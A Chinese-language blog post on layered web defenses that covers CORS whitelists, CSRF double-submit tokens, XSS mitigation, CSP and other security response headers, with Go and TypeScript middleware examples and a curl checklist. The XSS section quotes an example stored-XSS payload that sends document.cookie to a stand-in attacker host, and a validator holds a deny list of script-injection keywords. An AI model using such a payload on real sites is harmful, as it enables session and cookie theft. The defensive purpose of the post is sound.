---
title: Web 防护：CORS、CSRF、XSS 和响应头
tags:
  - 安全
  - Web
  - 前端
category: 技术
hero: ./web-security-hero.jpg
heroCopyright: Photo on <a href="https://unsplash.com/photos/w7ZyuGYNpRQ?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Unsplash</a>
type: post
date: 2026-05-08 10:53:21
---

Web 安全话题很大。落到网关和前端，我们日常打交道的是这些层：谁能跨域、谁能冒用登录态发写请求、脚本能不能进页面、响应头有没有把浏览器收紧。一层被绕过时，下一层还要在。下面按实现口径写一遍——例子里的域名一律用 `example.com`。

## CORS：白名单，别图省事写 *

跨域不是服务器「禁请求」，是浏览器按同源策略拦**读响应**。配置错了，恶意页可以借用户浏览器打你的 API。

典型剧本：

1. 用户已登录 `https://www.example.com`，浏览器带着会话 Cookie  
2. 用户打开了 `https://evil.example`  
3. 恶意页的 JS 向 `www.example.com` 的 API 发请求  
4. 若 CORS 回 `Access-Control-Allow-Origin: *` 且还允许凭证，响应能被 JS 读走  

未授权跨域访问、敏感数据被第三方读、借登录态做操作——都挂在这一层配松了。

原理上我们用白名单：

- 校验请求的 `Origin` 是否在名单里  
- 生产严格、开发可 `AllowAll`（便于本地联调）  
- **只有**白名单源才 `Allow-Credentials: true`  
- 正确响应 OPTIONS 预检（方法、头、最大缓存时间）  

```go
corsMiddleware := NewCORSMiddleware(CORSConfig{
  AllowedOrigins: []string{
    "http://localhost:3000",
    "http://localhost:3005",
    "https://www.example.com",
    "https://admin.example.com",
  },
  AllowAll: cfg.Mode == "debug",
})

h.Use(corsMiddleware.Middleware())
```

前端：

```ts
const client = axios.create({
  baseURL: '/',
  timeout: 10_000,
  withCredentials: true, // 允许收发 Cookie
});
```

`withCredentials: true` 时，服务端绝不能回 `*`。预检失败时，浏览器控制台比业务日志更早报警——别只看后端 200。

效果上：只有名单内源能跨域读 API；未授权源被拒并可记日志；开发可松、生产收紧。对我来说，CORS 管的是「哪个前端源配读响应」，不是鉴权本身。鉴权另做；CORS 配松了，鉴权再严也会被浏览器侧配合拖出来。

## CSRF：Double Submit Cookie

CORS 拦不住「简单表单跨站 POST」。恶意站可以让浏览器**自动带 Cookie**，请求看起来像用户本人点的。

典型剧本：

1. 用户登录了 `www.example.com`，会话 Cookie 还在  
2. 用户访问了 `evil.example`  
3. 页面里藏一个表单，自动 POST 到 `www.example.com` 的删资源接口  
4. 浏览器自动带 Cookie，服务端若只认 Cookie，就当成合法写操作  

历史上 Gmail 曾吃过 CSRF：攻击者可改用户邮件过滤规则。旧办法只靠 Referer，代理和隐私模式会误伤；只靠 SameSite，老客户端和部分跨站嵌套也不够。

我们用 Double Submit Cookie：

1. 服务器生成加密安全的随机 token，写入 Cookie（JS 可读，或另有下发接口）  
2. 前端把同一 token 放进 `X-CSRF-Token` 一类头  
3. 服务端对 POST / PUT / PATCH / DELETE 校验 Cookie 与 Header 一致  
4. 登录、取 token、健康检查等路径排除，避免先有鸡还是先有蛋  

为什么有效？恶意站能让浏览器**带上**跨域 Cookie，但同源策略下它的 JS **读不到**你的 Cookie，也就填不出正确的自定义头。

```go
csrfMiddleware := NewCSRFMiddleware(CSRFConfig{
  ExcludePaths: []string{
    "/auth/login",
    "/auth/admin/login",
    "/api/csrf-token",
    "/health",
  },
  SecureCookie: cfg.Mode == "release",
  SameSite:     "Lax",
})

h.Use(csrfMiddleware.Middleware())
```

前端拦截器：

```ts
function getCsrfToken(): string | null {
  const match = document.cookie.match(/(?:^|; )csrf_token=([^;]+)/);
  return match ? decodeURIComponent(match[1]) : null;
}

client.interceptors.request.use((config) => {
  const method = (config.method ?? 'get').toLowerCase();
  if (['get', 'head', 'options'].includes(method)) return config;
  const token = getCsrfToken();
  if (token) config.headers.set('X-CSRF-Token', token);
  return config;
});
```

生产 Cookie 开 `Secure`；`SameSite=Lax` 挡一部分跨站携带，和 token 双重提交是互补，不是互斥。Token 可设滚动有效期（例如 24h），刷新时旧请求要能容忍短暂窗口，或先打 `/api/csrf-token`。

效果：写方法缺 token 或两边不一致直接拒；对用户透明；和 CORS 各管一层——一个管谁能读，一个管谁能冒充写。

## XSS：存储、反射、DOM，对策同类

跨站脚本是最常见的一类洞：注入的脚本在别人浏览器里跑。路径分三种：

| 类型 | 怎么进来 | 典型面 |
|------|----------|--------|
| 存储型 | 进库再渲染 | 评论、描述、昵称 |
| 反射型 | URL / 参数原样打回页 | 搜索页、错误页 |
| DOM 型 | 纯前端拧 `location` / `innerHTML` | 前端路由、富文本预览 |

存储型剧本：攻击者在描述里塞 `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`；服务端未过滤进库；别人打开详情页，Cookie 被带走。反射型走 URL 参数直接拼进 HTML。DOM 型甚至不经过服务器——前端自己把不可信字符串写进 DOM。

英国航空公司 2018 年 XSS 相关事件常被拿来当案例（支付信息规模很大）。用意是提醒：XSS 不只是「弹个 alert」，可以接到真实业务链路。我这边不展开细节，只采信「输出没编码 + 脚本能跑 = 会话和表单都能被偷」这一层结论。

多层：

- **输入**：长度、类型、危险子串（`<script`、`javascript:`、`onerror=`、`<iframe`…）——黑名单不够，只能减损  
- **输出**：框架默认转义；必须富文本就 DOMPurify 一类白名单  
- **Cookie**：会话尽量 `HttpOnly`；能 `Secure` + `SameSite` 就开  
- **CSP**：限制脚本来源，即使漏了注入也难执行  

```go
func ValidateTitle(title string) error {
  if len(title) < 5 || len(title) > 100 {
    return errors.New("标题长度必须在 5-100 之间")
  }
  lower := strings.ToLower(title)
  for _, p := range []string{"<script", "javascript:", "onerror=", "onload=", "<iframe"} {
    if strings.Contains(lower, p) {
      return errors.New("标题包含非法字符")
    }
  }
  return nil
}
```

```tsx
// React 默认转义——这是日常该走的路
function Title({ title }: { title: string }) {
  return <h1>{title}</h1>;
}

// 富文本：消毒后再进 dangerouslySetInnerHTML
import DOMPurify from 'dompurify';

function SafeDescription({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u'],
    ALLOWED_ATTR: ['class'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

只做前端或只做后端过滤，都不够。对我来说，XSS 没有「一个中间件搞定」；CSP 是最后一道闸，不是第一道。效果上：危险输入尽量进不了库；默认转义挡住大部分反射；HttpOnly 让偷 Cookie 的脚本少一条捷径。

## CSP：白名单资源从哪来

即使脚本字符串漏进了页面，CSP 还可以卡「能不能执行、从哪加载」。白名单机制：页面只准加载名单内的脚本、样式、图、连接。

| 指令 | 作用 | 示例 |
|------|------|------|
| `default-src` | 默认兜底 | `'self'` |
| `script-src` | 脚本 | `'self' 'nonce-…'` |
| `style-src` | 样式 | `'self'`（尽量少 `unsafe-inline`） |
| `img-src` | 图 | `'self' data: https:` |
| `connect-src` | XHR / fetch / WS | `'self' wss://api.example.com` |
| `frame-ancestors` | 谁能嵌你 | `'none'` 或 `'self'` |
| `base-uri` | `<base>` | `'self'` |
| `form-action` | 表单提交目标 | `'self'` |

```go
SecurityHeadersConfig{
  CSPDirectives: map[string][]string{
    "default-src":     {"'self'"},
    "script-src":      {"'self'", "'nonce-{random}'"},
    "style-src":       {"'self'"},
    "img-src":         {"'self'", "data:", "https:"},
    "connect-src":     {"'self'", "wss://api.example.com"},
    "frame-ancestors": {"'none'"},
    "base-uri":        {"'self'"},
    "form-action":     {"'self'"},
  },
  CSPReportOnly: cfg.Mode == "debug",
}
```

上线前先 `Content-Security-Policy-Report-Only` 收报告，再切 enforce。`unsafe-inline` 一开，CSP 对 XSS 的牙齿就钝了；能上 nonce / hash 就上。

效果：未授权脚本难执行；外站恶意资源加载被拒；`frame-ancestors 'none'` 顺带挡 iframe 嵌入。

## HSTS：传输层的「以后只走 HTTPS」

中间人可以在用户**第一次**敲 `http://www.example.com` 时做 SSL 剥离：拦明文请求，塞钓鱼页。服务器哪怕全站 HTTPS，首访仍可能走 HTTP。

HSTS 用响应头告诉浏览器：在 `max-age` 内本域（及可选子域）只走 HTTPS；HTTP 自动升级；证书无效则硬失败，不给点「高级继续」。

```go
SecurityHeadersConfig{
  EnableHSTS:            cfg.Mode == "release",
  HSTSMaxAge:            31536000, // 1 年
  HSTSIncludeSubdomains: true,
}
```

生产再开；子域都 HTTPS 再 `includeSubDomains`。续期必须稳——HSTS 站点比「还能绕过」更绝。分阶段拉长 `max-age`、是否 preload，和证书那篇同一套纪律。

效果：挡剥离；自动升级明文；证书错了宁断不断错。

## X-Frame-Options：别让人嵌你的按钮

点击劫持：恶页用透明 iframe 叠你的确认按钮，骗用户点。2008 年 Adobe Flash 设置页、2010 年 Twitter 都有被拿来讲的案例——摄像头/麦克风开关、自动关注，都是「用户以为在点别的东西」。

| 值 | 含义 |
|----|------|
| `DENY` | 谁都不许嵌 |
| `SAMEORIGIN` | 仅同源可嵌 |

```go
c.Header("X-Frame-Options", "DENY")
```

现代优先 CSP 的 `frame-ancestors`；两者可同时存在过渡。需要被自己的后台嵌时用 `SAMEORIGIN`，别为了省事全局放行。效果就是：恶意站嵌不进来，叠按钮的戏没舞台。

## X-Content-Type-Options: nosniff

浏览器有时会忽略你声明的 `Content-Type`，按内容猜。剧本：

1. 攻击者上传 `avatar.jpg`，内容其实是脚本 / HTML  
2. 服务器仍回 `Content-Type: image/jpeg`  
3. 浏览器嗅探后当 HTML/脚本解析，代码跑起来  

```http
X-Content-Type-Options: nosniff
```

告诉浏览器：严格按你声明的类型解析。上传接口同时校验魔数与 Content-Type；nosniff 是浏览器侧补刀，不是唯一防线。效果：MIME 嗅探这条捷径被掐掉，文件上传洞少一截利用面。

## Referrer-Policy：别把 token 漏到外站

浏览器发请求时常带 `Referer`，可能把敏感 URL 整段带走。

剧本：用户在 `https://www.example.com/reset-password?token=abc123xyz` 点外链 `https://other.example`；对方收到的 Referer 里带着重置 token。

推荐：

```http
Referrer-Policy: strict-origin-when-cross-origin
```

同源带完整 URL；跨域只带 origin；HTTPS→HTTP 不带。比 `no-referrer` 少伤分析，比默认策略少漏参。效果：跨站外链看不到 query；隐私和重置链路都少一截暴露面。

## Permissions-Policy：不需要的能力直接关

恶意脚本或第三方内容可能滥用地理位置、摄像头、麦克风、支付一类敏感能力。响应头直接默认关：

```http
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=()
```

真要用地图 / 通话再按源放开。效果：第三方或 XSS 之后，少一截可滥用的传感器与支付能力。

## 中间件顺序：预检和 Cookie 谁先谁后

顺序错了，OPTIONS 可能撞上 CSRF，或安全头根本加不到错误路径上。常见从外到内：

```go
h.Use(rateLimiter.Middleware())               // 1. 限流最外
h.Use(corsMiddleware.Middleware())            // 2. OPTIONS 尽早结束
h.Use(securityHeadersMiddleware.Middleware()) // 3. 响应头
h.Use(csrfMiddleware.Middleware())            // 4. 读 Cookie、验写方法
// 5. 业务路由
router.Register(h)
```

限流防刷；CORS 先处理预检，避免预检被 CSRF 误杀；安全头尽量覆盖错误响应（看框架是否在中间件里统一 `Writer`）；CSRF 依赖 Cookie 已由上游写好。鉴权中间件通常在 CSRF 之后、业务之前——具体以「未登录该不该发 CSRF cookie」的产品约定为准。

## 各层挡什么

| 层 | 挡什么 | 关键手段 |
|----|--------|----------|
| CORS | 未授权源读响应 | Origin 白名单 + 凭证控制 |
| CSRF | 跨站冒用写请求 | Double Submit + SameSite |
| XSS | 脚本进页 | 输入 / 输出 / HttpOnly / CSP |
| CSP | 恶意资源执行 | 指令白名单 + nonce |
| HSTS | 剥离 / 明文首访 | 强制 HTTPS |
| XFO / frame-ancestors | 点击劫持 | 禁嵌或仅同源 |
| nosniff | MIME 嗅探 | 严格按 Content-Type |
| Referrer-Policy | URL 泄参 | 跨域降级为 origin |
| Permissions-Policy | 能力滥用 | 默认关闭敏感 API |

纵深防御：一层漏了，下一层还在。环境区分：开发可松、生产收紧。对用户尽量透明。安全事件要能记日志，方便审计。性能上这层中间件通常是毫秒级；别用「怕慢」当借口关掉。

## 上线前 curl 清单

```bash
# CORS：白名单源应回显 Origin + Allow-Credentials
curl -sI -H "Origin: https://admin.example.com" \
  https://api.example.com/health
# 期望：
# Access-Control-Allow-Origin: https://admin.example.com
# Access-Control-Allow-Credentials: true

# CORS：非白名单不应回显该 Origin（或直接无 ACAO）
curl -sI -H "Origin: https://evil.example" \
  https://api.example.com/health

# 预检
curl -sI -X OPTIONS \
  -H "Origin: https://www.example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type,x-csrf-token" \
  https://api.example.com/api/items

# CSRF cookie 是否下发
curl -s -c /tmp/cj -b /tmp/cj https://api.example.com/api/csrf-token
grep csrf /tmp/cj

# 写请求缺 token 应失败（示意）
curl -sI -X POST -b /tmp/cj https://api.example.com/api/items

# 安全响应头
curl -sI https://www.example.com
# 期望见到：
# Content-Security-Policy: …
# Strict-Transport-Security: max-age=31536000
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Referrer-Policy: strict-origin-when-cross-origin
# Permissions-Policy: geolocation=(), microphone=(), camera=()
```

也可以丢进 [Mozilla Observatory](https://observatory.mozilla.org/)、[securityheaders.com](https://securityheaders.com/)、[SSL Labs](https://www.ssllabs.com/ssltest/) 扫一遍。

参考：[OWASP Top 10](https://owasp.org/www-project-top-ten/)、[CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)、[MDN CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)、[MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)、[OWASP Secure Headers](https://owasp.org/www-project-secure-headers/)。

对我来说，这套东西的价值是默认拒绝异常跨域和异常写请求，并把浏览器行为收紧；不是宣称「已经绝对安全」。新接口上线时记得问：要不要进 CSRF、Origin 在不在名单、输出有没有绕过转义、响应头在错误路径上有没有丢。
